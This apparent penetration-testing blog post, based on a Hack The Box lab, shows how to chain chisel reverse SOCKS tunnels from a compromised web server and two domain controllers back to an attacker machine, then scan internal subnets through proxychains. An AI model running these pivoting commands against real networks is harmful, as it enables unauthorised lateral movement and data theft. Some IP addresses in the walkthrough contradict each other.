---
title:  Pivoting with Chisel
date: 2020-11-18 12:17:34 -0400
categories: [Pentesting , Pivoting]
tags: [pivot, red, team, network, chisel]
image:
  path: /assets/img/post/pivoting.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Summary
Recently I've completed the Hack The Box Dante Pro Labs and really enjoyed it. One of the most crucial pieces to being successful in the lab is understanding how to pivot properly. So I wanted to write up a blog post explaining how to properly pivot.

# Network
Below is a simulated network that I have drawn up to help understand things a bit more visually as I set though setting up or proxy tunnels.

![Image](/assets/img/post/2020-11-18-pivoting-with-chisel/network.png)


Lets assume that we have enumerated the network and identified a computer on the Admin network and we need to gain access and exfil data from it. Our attacker machine is `10.10.101.51` and the web server we need to breach is external facing and has an external IP of `10.10.101.50` and an internal IP or `172.16.1.101`. Lets assume that you have a foothold or even root/admin on the web server and you want begin to do recon of the internal network. There are a ton of ways to go about doing this such as:

- Transfering a tool such as nmap directly on the machine we have access to and scan the internal network.
- A dynamic ssh tunnel utilizing socks4/socks5 and use proxychains and nmap (may be a bit slow)
- Use Cobalt Strike to setup a proxy to pivot through.

The main focus of this post is to understand how to properly pivot without those other methods and use chisel instead.

First we need to start a chisel server running on port 8001 our attacker machine so we can pivot through the `10.10.101.50` machine and gain access to the network. Run the command below to start a server:

```shell
#Run command on attacker machine (10.10.101.51)
./chisel server -p 8001 --reverse
```

Assuming we have a foothold on the Web Server we can transfer chisel to the machine and connect back to our chisel server to complete the tunnel.

```shell
#Run command on Web Server machine (172.16.1.101 || 10.10.101.50)
./chisel client 10.10.101.51:8001 R:1080:socks
```
This will create a reverse proxy and open port 1080 on our machine. Now we can modify our proxychains.conf file to use this proxy. At the bottom of the `/etc/proxychains.conf` add `socks5 127.0.0.1 1080`. Now that we have this working we can use this to conduct a simple nmap of the internal network from the Web Server. 

```shell
#Run command on attacker machine (10.10.101.50 || 172.16.1.101)
proxychains4 nmap 172.16.1.1/24
```
Now that we have gathered all the info about our current subnet and gained access to all the computers including the domain controller we now want to pivot into the second subnet. We are assuming that the domain controller on the Office Network has a trust with the Admin Network. First we need to start a chisel server on the Web Server in addition to the chisel client we are already using to pivot onto the Office Network similar to how we started a chisel server on our attacker machine. Next we need to transfer the chisel client to the Windows domain controller (`172.16.1.5`) to connect to our chisel server on the web server system so can chain our tunnel. 

```shell
#Run command on Web Server machine (172.16.1.101)
./chisel server -p 8002 --reverse
```
Then on the domain controller (172.16.1.5) in the office network we want create a new connection that will connect to the chisel server running on `172.16.1.101` on port 8002

```shell
#Run command on Office Domain Controller machine (172.16.1.5)
chisel.exe client 172.16.1.101:8002 R:2080:socks
```
Finally we now want to add this new connection in our `proxychains.conf` which will look like something below.

```
socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
```

Our connection should now now be 
<img src="/assets/img/post/2020-11-18-pivoting-with-chisel/network2.png" style="width: 75%" >

Now that we can tunnel through the domain controller we can do some more recon and find the IP of the domain controller of the Admin network. Once we identify the IP of the DC in Admin network (`172.16.2.10`) we can begin to look for a path of compromise. 

Lets assume that we now have access to the domain controller in the Admin network. We now want to pivot again from the Office network DC to the Admin network DC so we can recon and eventually gain access to our target computer on the Admin network (`172.16.2.200`). First we want to create a server on the Office DC 

```shell
#Run command on Office Domain Controller machine (172.16.1.5 )
chisel.exe server -p 8003 --reverse
```
Then on the Admin DC we want to run the following command to connect back to our domain controller.

```shell
#Run command on Admin Domain Controller machine (172.16.2.5)
chisel.exe client 172.16.1.5:8003 R:3080:socks
```
Finally we want to add a third entry into our `proxychains.conf`

```
socks5 127.0.0.1 1080 
socks5 127.0.0.1 2080 
socks5 127.0.0.1 3080 
```

We have now successfully pivoted three times to get to our target goal which is to have access to the target computer on the admin network. The proxy connections should look something like below. Since we own the domain controller we can now use this to gain access to login to the machine at `172.16.2.200`

<img src="/assets/img/post/2020-11-18-pivoting-with-chisel/network3.png" style="width: 75%" >
